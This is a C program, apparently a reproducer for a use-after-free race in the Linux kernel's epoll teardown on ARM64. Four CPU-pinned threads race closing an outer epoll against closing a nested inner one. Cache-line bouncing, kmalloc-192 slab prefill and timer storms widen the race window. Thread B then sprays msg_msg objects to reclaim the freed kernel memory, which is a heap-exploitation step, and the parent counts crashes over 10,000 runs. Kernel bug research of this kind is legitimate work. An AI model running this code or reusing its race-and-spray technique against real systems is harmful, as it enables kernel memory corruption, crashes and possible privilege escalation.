// test_nat001.c — Statistical Natural Race Test with Timing-Widening Techniques
// ARM64-specific: L1 cache line = 64 bytes, kmalloc-192 cpu_partial = 120, HZ = 1000
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/wait.h>
#include <stdatomic.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <time.h>
#include <errno.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <math.h>

#define ITERATIONS_PER_BOOT 1000
#define CACHE_LINE_SIZE 64

// ============================================================
// TIMING WIDENING TECHNIQUE 1: False-Sharing Cache-Line Bouncing
// ============================================================
// Thread C (third thread) hammers a cache line that Thread A's
// critical path data sits on, causing L1/L2 misses and bus contention.
// This adds non-deterministic 10-1000+ cycle stalls to Thread A.
typedef struct {
    volatile uint64_t bounce_line[CACHE_LINE_SIZE / 8]; // 64-byte cache line
    uint64_t padding[8]; // prevent false sharing with other data
} __attribute__((aligned(CACHE_LINE_SIZE))) bounce_t;

static bounce_t *cache_bounce = NULL;

// ============================================================
// TIMING WIDENING TECHNIQUE 2: Slab/Allocator Contention
// ============================================================
// Pre-fill kmalloc-192 with many allocations, then free them
// to partial lists. Thread A's kfree_rcu and Thread B's kmalloc
// will contend on per-CPU partial locks, adding microsecond variance.
#define SLAB_PREFILL_COUNT 5000
static int *slab_prefill_fds = NULL; // eventpoll fds for prefill

// ============================================================
// TIMING WIDENING TECHNIQUE 3: Timer/IPI Storms
// ============================================================
// Thread D creates timerfd storms and forces cross-CPU IPIs
// by migrating tasks, adding interrupt latency variance to Thread A.
#define TIMER_STORM_COUNT 100
static int timer_fds[TIMER_STORM_COUNT];

// ============================================================
// RACE TOPOLOGY: Multi-Epitem (outer epoll watches 2+ inner epolls)
// ============================================================
// Thread A processes epitem 1 (~250-550 cycles), then epitem 2.
// Thread B targets epitem 2's inner epoll close+free.
// The instruction-count window (~125-275ns at 2GHz) is the base window.

int ep_outer = -1;
int ep_inner[2] = {-1, -1};
int pipe_fds[2][2] = {{-1, -1}, {-1, -1}};

atomic_int ready_a = 0, ready_b = 0, ready_c = 0, ready_d = 0, go = 0;
atomic_int hit_count = 0;
atomic_int iter_count = 0;

// ============================================================
// Thread A (CPU 0): close(outer_epoll) → triggers ep_clear_and_put
// ============================================================
void *thread_a(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store_explicit(&ready_a, 1, memory_order_release);
    while (!atomic_load_explicit(&go, memory_order_acquire)) { /* spin */ }

    close(ep_outer);  // Triggers ep_clear_and_put → __ep_remove for epitem 1, then epitem 2
    return NULL;
}

// ============================================================
// Thread B (CPU 1): wait for go → close(inner_epoll[1]) + msg_msg spray
// ============================================================
void *thread_b(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store_explicit(&ready_b, 1, memory_order_release);
    while (!atomic_load_explicit(&go, memory_order_acquire)) { /* spin */ }

    // Target inner_epoll[1] (epitem 2) — race against Thread A's 2nd __ep_remove
    close(ep_inner[1]);

    // msg_msg spray to reclaim freed inner_epoll[1]->ep
    int msgq = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq >= 0) {
        struct { long mtype; char mtext[144]; } msg = { .mtype = 1 };
        memset(msg.mtext, 0x41, 144);
        for (int i = 0; i < 5000; i++) {
            if (msgsnd(msgq, &msg, 144, IPC_NOWAIT) < 0) break;
        }
        msgctl(msgq, IPC_RMID, NULL);
    }
    return NULL;
}

// ============================================================
// Thread C (CPU 0): Cache-line bouncing on shared data
// ============================================================
// Hammers a cache line that Thread A's epoll structures likely touch
// (the outer_epoll's rbr tree root is at offset 112, but we can't
// directly target it. Instead, we hammer a nearby line to cause
// L2 contention on the memory bus).
void *thread_c(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store_explicit(&ready_c, 1, memory_order_release);
    while (!atomic_load_explicit(&go, memory_order_acquire)) { /* spin */ }

    // Hammer the bounce line continuously during the race window
    volatile uint64_t *line = cache_bounce->bounce_line;
    for (int i = 0; i < 1000000; i++) { // large enough to cover race
        line[i % 8] = i;
        __sync_synchronize(); // force write-through
    }
    return NULL;
}

// ============================================================
// Thread D (CPU 1): Timer/IPI storm
// ============================================================
void *thread_d(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store_explicit(&ready_d, 1, memory_order_release);
    while (!atomic_load_explicit(&go, memory_order_acquire)) { /* spin */ }

    // Fire timerfds rapidly to generate timer interrupts
    struct itimerspec its = { .it_interval = {0, 1000}, .it_value = {0, 1000} }; // 1us
    for (int i = 0; i < TIMER_STORM_COUNT; i++) {
        timerfd_settime(timer_fds[i], 0, &its, NULL);
    }

    // Busy loop to generate IPIs via scheduler activity
    for (int i = 0; i < 100000; i++) {
        sched_yield();
    }
    return NULL;
}

// ============================================================
// Slab prefill: create many eventpoll fds to fill kmalloc-192 partial lists
// ============================================================
void slab_prefill_init() {
    slab_prefill_fds = calloc(SLAB_PREFILL_COUNT, sizeof(int));
    for (int i = 0; i < SLAB_PREFILL_COUNT; i++) {
        int ep = epoll_create1(0);
        if (ep < 0) break;
        int pfd[2];
        if (pipe(pfd) < 0) { close(ep); break; }
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = pfd[0] };
        if (epoll_ctl(ep, EPOLL_CTL_ADD, pfd[0], &ev) < 0) { close(ep); close(pfd[0]); close(pfd[1]); break; }
        slab_prefill_fds[i] = ep;
        // Don't close pipes — keep the epitems alive in the tree
    }
    printf("[NAT-001] Slab prefill: %d eventpoll fds created\n", SLAB_PREFILL_COUNT);
}

void slab_prefill_cleanup() {
    if (slab_prefill_fds) {
        for (int i = 0; i < SLAB_PREFILL_COUNT; i++) {
            if (slab_prefill_fds[i] > 0) close(slab_prefill_fds[i]);
        }
        free(slab_prefill_fds);
        slab_prefill_fds = NULL;
    }
}

// ============================================================
// Timer storm init
// ============================================================
void timer_storm_init() {
    for (int i = 0; i < TIMER_STORM_COUNT; i++) {
        timer_fds[i] = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);
        if (timer_fds[i] < 0) break;
    }
    printf("[NAT-001] Timer storm: %d timerfds created\n", TIMER_STORM_COUNT);
}

void timer_storm_cleanup() {
    for (int i = 0; i < TIMER_STORM_COUNT; i++) {
        if (timer_fds[i] > 0) close(timer_fds[i]);
    }
}

// ============================================================
// Cache bounce init
// ============================================================
void cache_bounce_init() {
    cache_bounce = mmap(NULL, sizeof(bounce_t), PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cache_bounce == MAP_FAILED) {
        perror("mmap cache_bounce");
        exit(1);
    }
    memset(cache_bounce, 0, sizeof(bounce_t));
    printf("[NAT-001] Cache bounce line allocated at %p\n", cache_bounce);
}

void cache_bounce_cleanup() {
    if (cache_bounce && cache_bounce != MAP_FAILED) {
        munmap(cache_bounce, sizeof(bounce_t));
        cache_bounce = NULL;
    }
}

// ============================================================
// One iteration: fork child, run race, detect kernel OOPS
// ============================================================
int run_one_iteration() {
    atomic_store(&ready_a, 0);
    atomic_store(&ready_b, 0);
    atomic_store(&ready_c, 0);
    atomic_store(&ready_d, 0);
    atomic_store(&go, 0);

    pid_t pid = fork();
    if (pid == 0) {
        // Child: isolated address space, clean state
        ep_outer = epoll_create1(0);
        ep_inner[0] = epoll_create1(0);
        ep_inner[1] = epoll_create1(0);
        if (ep_outer < 0 || ep_inner[0] < 0 || ep_inner[1] < 0) _exit(1);

        if (pipe(pipe_fds[0]) < 0 || pipe(pipe_fds[1]) < 0) _exit(1);

        // Add inner_epoll[0] (epitem 1) and inner_epoll[1] (epitem 2) to outer
        struct epoll_event ev = { .events = EPOLLIN };
        ev.data.fd = ep_inner[0];
        if (epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[0], &ev) < 0) _exit(1);
        ev.data.fd = ep_inner[1];
        if (epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[1], &ev) < 0) _exit(1);

        pthread_t ta, tb, tc, td;
        pthread_create(&ta, NULL, thread_a, NULL);
        pthread_create(&tb, NULL, thread_b, NULL);
        pthread_create(&tc, NULL, thread_c, NULL);
        pthread_create(&td, NULL, thread_d, NULL);

        // Wait for all threads ready
        while (!atomic_load_explicit(&ready_a, memory_order_acquire) ||
               !atomic_load_explicit(&ready_b, memory_order_acquire) ||
               !atomic_load_explicit(&ready_c, memory_order_acquire) ||
               !atomic_load_explicit(&ready_d, memory_order_acquire)) { }

        // GO!
        atomic_store_explicit(&go, 1, memory_order_release);

        pthread_join(ta, NULL);
        pthread_join(tb, NULL);
        pthread_join(tc, NULL);
        pthread_join(td, NULL);

        _exit(0); // Clean exit = no crash
    }

    // Parent: wait for child, check for kernel OOPS (SIGKILL/SIGSEGV/SIGBUS)
    int status;
    waitpid(pid, &status, 0);

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (sig == SIGKILL || sig == SIGSEGV || sig == SIGBUS) {
            return 1; // Kernel OOPS killed child
        }
    }
    return 0; // No crash
}

// ============================================================
// Main: 10 boots × 1000 iterations = 10,000 total
// ============================================================
int main() {
    printf("[NAT-001] Statistical Natural Race Test with Timing Widening\n");
    printf("[NAT-001] Target: 10,000 iterations (10 boots × 1000)\n");
    printf("[NAT-001] Techniques: cache-bounce + slab-prefill + timer-storm + multi-epitem\n");
    printf("[NAT-001] ARM64: cache_line=%d, kmalloc-192 cpu_partial=120, HZ=%d\n",
           CACHE_LINE_SIZE, 120, 1000);

    cache_bounce_init();
    slab_prefill_init();
    timer_storm_init();

    int hits = 0, total = 0;
    for (int boot = 0; boot < 10; boot++) {
        printf("[*] Boot %d starting...\n", boot + 1);
        for (int i = 0; i < ITERATIONS_PER_BOOT; i++) {
            int r = run_one_iteration();
            if (r == 1) {
                hits++;
                printf("[!] HIT #%d at iter %d (boot %d)\n", hits, total, boot + 1);
            }
            total++;

            if (total % 100 == 0) {
                printf("[*] Progress: %d/10000, hits=%d (%.6f%%)\n",
                       total, hits, 100.0 * hits / total);
            }
        }
        printf("[*] Boot %d complete. Hits: %d/%d\n", boot + 1, hits, total);
        // Reboot QEMU between boots to reset kernel state (handled by parent script)
    }

    printf("[NAT-001] FINAL: %d hits in %d iterations (%.6f%%)\n",
           hits, total, 100.0 * hits / total);

    // Wilson 95% CI
    if (total > 0) {
        double p = (double)hits / total;
        double z = 1.96;
        double denom = 1 + z*z/total;
        double centre = (p + z*z/(2*total)) / denom;
        double half = z * sqrt(p*(1-p)/total + z*z/(4*total*total)) / denom;
        printf("[NAT-001] 95%% Wilson CI: [%.6f, %.6f]\n", centre - half, centre + half);
    }

    cache_bounce_cleanup();
    slab_prefill_cleanup();
    timer_storm_cleanup();

    return hits > 0 ? 0 : 1;
}